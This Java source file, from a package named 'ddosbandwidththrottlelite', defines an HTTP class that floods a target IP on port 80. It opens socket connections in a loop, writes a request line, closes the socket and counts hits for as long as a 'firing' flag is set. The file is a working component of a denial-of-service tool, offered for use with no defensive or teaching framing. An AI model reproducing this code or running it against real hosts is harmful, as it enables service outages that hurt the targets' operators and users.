package com.notebook.idealabs.ddosbandwidththrottlelite;

/**
 * Created by Admin on 10-09-2017.
 */

import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class HTTP implements Runnable {
    public static int count = 0;
    public static long startTime = 0;
    private String ip;
    private int pause;
    private int timeout;

    public HTTP(String ip, int timeout, int pause) {
        this.ip = ip;
        this.timeout = timeout;
        this.pause = pause;
    }

    public void run() {
        count = 0;
        startTime = System.currentTimeMillis();
        while (dosService.firing) {
            try {
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(this.ip, 80), this.timeout);
                OutputStreamWriter out = new OutputStreamWriter(socket.getOutputStream());
                out.write("GET / HTTP/1.1");
                out.close();
                socket.close();
                count++;
                Thread.sleep((long) this.pause);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
